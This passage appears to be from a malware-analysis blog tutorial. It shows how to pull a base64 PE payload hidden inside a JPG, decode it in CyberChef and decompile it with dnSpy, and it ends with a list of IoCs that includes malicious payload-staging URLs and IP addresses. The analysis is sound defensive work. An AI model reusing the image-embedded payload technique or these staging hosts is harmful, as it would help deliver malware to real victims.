`grep -aHr "BASE64_START" image.jpg`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582647128/2fd58943-4498-4df8-a071-eb7a6f055e47.png align="center")

This was a terrible mistake 😅 and our terminal get’s overflown with text 😵‍💫😬

BUT at least we know that the code is in the image → so now we want to extract it

we can either transfer the `image.jpg` with a temporary python webserver / sftp or another method of your choice

→ this file needs to get into your flareVM Windows machine

You can also download it from here:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582682888/85cfcf03-155c-4244-9194-a0a28b8ded30.png align="center")

Then you modify the stage3 PowerShell script to only isolate the base64 code:

```powershell
    # read image as bytes from the location it is in -> adjust this to your setup
    $imageBytes = [System.IO.File]::ReadAllBytes("C:\\Users\\Administrator\\Downloads\\image.jpg"); 
    
    if ($imageBytes -ne $null) { 
        $imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes); 
        $startFlag = '<<BASE64_START>>';
        $endFlag = '<<BASE64_END>>'; 
        $startIndex = $imageText.IndexOf($startFlag); 
        $endIndex = $imageText.IndexOf($endFlag); 

        if ($startIndex -ge 0 -and $endIndex -gt $startIndex) {
 
           $startIndex += $startFlag.Length; 
           $base64Length = $endIndex - $startIndex; 
           $base64Command = $imageText.Substring($startIndex, $base64Length); 
						# write the base64 command to a file called base64stage3.txt in the downloads folder
           $base64Command | out-file -filepath C:\\Users\\Administrator\\downloads\\base64stage3.txt;
        }
}
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582830070/bb62ed05-d1ef-4285-9b76-0faa0982a326.png align="center")

Then proceed to download the base64stage3.txt and plug it into cyberchef

[https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)

in the top right, click `Open file as input` ⬇️

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582847528/a51eef8e-9df9-40d5-894a-4b93b9b81edf.png align="center")

Then select the correct file:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582868626/8c506481-772a-4b45-83e4-9f9646fb1975.png align="center")

and setup the following recipe:

decode text → `UTF-16LE` → from base64

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709582917238/53dc8aba-f14d-40d7-bd0b-df870139e25a.png align="center")

You can see on the right side that there is a `specific` readable line that should scare you 😬

`This program cannot be run in DOS mode.`

That means this is a binary, a PE file to be exact (portable executable).

What do we do with it? 🤔

First, download the file from cyberchef ⬇️

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709583084913/c84b35c8-af12-4b24-b2cb-5677033ea31f.png align="center")

Throw it back into flareVM and see if you can decipher some of it’s content

As we know that this is a PE file we want to use the PE tools available with flarevm to have a look inside, e.g. use `CFF Explorer` from the `Tools` → `PE` directory and load the exe file ⬇️

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709583096171/43d0bedf-8e4a-400e-9ce8-801bbcb31602.png align="center")

Here you can see some interesting information on the right side → 1. thisi s a portable executable for 32 bit architecture (x86) AND this is a .NET assembly

The last part should get you excited because that means we can easily decompile it with 2 clicks 🥳

At the bottom you can also see a visual basic file that might be interesting in the future `Projetoautomacao.vb` which btw. appears to be Portuguese / Brazilian

Wonderful, if you want to decompile the binary and look at the source code either `dnSpy.exe` or `ILSpy.exe` are your favorite friends (its the same tool basically)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709583163356/43aa357f-0540-41c1-a953-e3b289fc7afd.png align="center")

Open it → click on File → Open → select the correct malware.exe file and wait a couple of seconds for the decompilation to finish

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709583177502/3cc29fc5-ab7e-4774-9497-6affa64f1fca.png align="center")

Once that is done you should see a new entry in the `Assemblies` list on the left, called `download`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709583189102/766ecc6d-6f3d-4249-b16d-3d0325d5d29a.png align="center")

We wont go into more details today but feel free to look around 🙂

Back to our stage3 payload → We have one more interesting url that we have not looked at yet:

```c
txt.diord46esab/19.412.542.271//:ptth
```

This might look a little interesting but lucky for us you are a great backwards-reader 🧑‍🏫

For those of you who are not → `http[:]//172.245.214.91/base64droid.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709583233792/f684b90d-80b3-480a-88f9-c953400e61b3.png align="center")

When you try opening the url with browserling it unfortunately fails to load so most likely it’s dead 💀

… but still a good IoC in the filename and IP address for future shenanigans.

and this friends is how you can report your collected IoCs / urls from malware.

## IoCs

| comprobante\_swift89534657687.js |
| --- |
| https\[:\][//paste.ee/d/ARhCV](//paste.ee/d/ARhCV) |
| https\[:\][//uploaddeimagens.com.br/images/004/731/991/original/new\_image.jpg?1707144482](//uploaddeimagens.com.br/images/004/731/991/original/new_image.jpg?1707144482) |
| http\[:\][//45.74.19.84/xampp/bkp/js\_bkp.jpg](//45.74.19.84/xampp/bkp/js_bkp.jpg) |
| http\[:\][//172.245.214.91/base64droid.txt](//172.245.214.91/base64droid.txt) |

PS.: if you read until here you are my favorite! Also, I am filming the whole process right now but won't be able to publish it before the post goes out so feel free to check out the YouTube channel for a video walkthrough in the next day(s):

[https://youtube.com/@maikroservice](https://youtube.com/@maikroservice)

THX 💜 and happy Hunting 🎯